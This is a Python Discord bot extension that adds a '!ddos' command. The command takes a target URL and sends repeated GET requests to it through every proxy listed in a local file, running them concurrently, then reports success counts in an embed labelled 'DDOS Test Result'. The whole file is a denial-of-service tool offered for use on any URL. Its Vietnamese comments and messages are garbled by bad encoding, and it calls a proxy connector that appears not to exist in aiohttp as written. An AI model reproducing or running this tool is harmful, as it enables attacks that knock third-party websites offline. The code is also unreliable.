import discord
from discord.ext import commands
import aiohttp
import asyncio
import re
import time

class DDOS(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="ddos")
    async def ddos(self, ctx, url: str, requests_per_proxy: int = 3):
        """
        !ddos [url] [s·ªë request m·ªói proxy, m·∫∑c ƒë·ªãnh 3]
        """
        await ctx.send("üöÄ ƒêang b·∫Øt ƒë·∫ßu g·ª≠i request, vui l√≤ng ch·ªù...")

        # ƒê·ªçc proxy t·ª´ file
        proxies = []
        with open("proxies.txt", "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                # L·ªçc proxy h·ª£p l·ªá (IP:PORT ho·∫∑c http://... ho·∫∑c socks4://...)
                if re.match(r"^(http://|socks4://)?\d{1,3}(\.\d{1,3}){3}:\d+", line):
                    proxies.append(line)

        total_proxy = len(proxies)
        total_requests = total_proxy * requests_per_proxy
        success = 0
        failed = 0

        start_time = time.time()

        async def send_request(proxy):
            nonlocal success, failed
            for _ in range(requests_per_proxy):
                try:
                    if proxy.startswith("socks4://"):
                        conn = aiohttp.ProxyConnector.from_url(proxy)
                    elif proxy.startswith("http://"):
                        conn = aiohttp.ProxyConnector.from_url(proxy)
                    else:
                        conn = aiohttp.ProxyConnector.from_url(f"http://{proxy}")
                    timeout = aiohttp.ClientTimeout(total=8)
                    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
                        async with session.get(url) as resp:
                            if resp.status == 200:
                                success += 1
                            else:
                                failed += 1
                except Exception:
                    failed += 1

        # Ch·∫°y ki·ªÉm tra song song (t·ªëi ƒëa 20 proxy c√πng l√∫c)
        tasks = []
        sem = asyncio.Semaphore(20)
        async def sem_task(proxy):
            async with sem:
                await send_request(proxy)

        for proxy in proxies:
            tasks.append(sem_task(proxy))
        await asyncio.gather(*tasks)

        end_time = time.time()
        duration = end_time - start_time

        # T·∫°o embed k·∫øt qu·∫£
        embed = discord.Embed(
            title="üí• DDOS Test Result",
            color=discord.Color.red()
        )
        embed.add_field(name="üåê URL", value=url, inline=False)
        embed.add_field(name="üî¢ Proxy s·ª≠ d·ª•ng", value=str(total_proxy), inline=True)
        embed.add_field(name="üîÅ Request m·ªói proxy", value=str(requests_per_proxy), inline=True)
        embed.add_field(name="üìä T·ªïng request", value=str(total_requests), inline=True)
        embed.add_field(name="‚úÖ Th√†nh c√¥ng", value=f"{success} request", inline=True)
        embed.add_field(name="‚ùå Th·∫•t b·∫°i", value=f"{failed} request", inline=True)
        embed.add_field(name="‚è±Ô∏è Th·ªùi gian", value=f"{duration:.2f} gi√¢y", inline=True)
        embed.set_footer(text="DDOS Test | by your bot")
        await ctx.send(embed=embed)

async def setup(bot):
    await bot.add_cog(DDOS(bot))
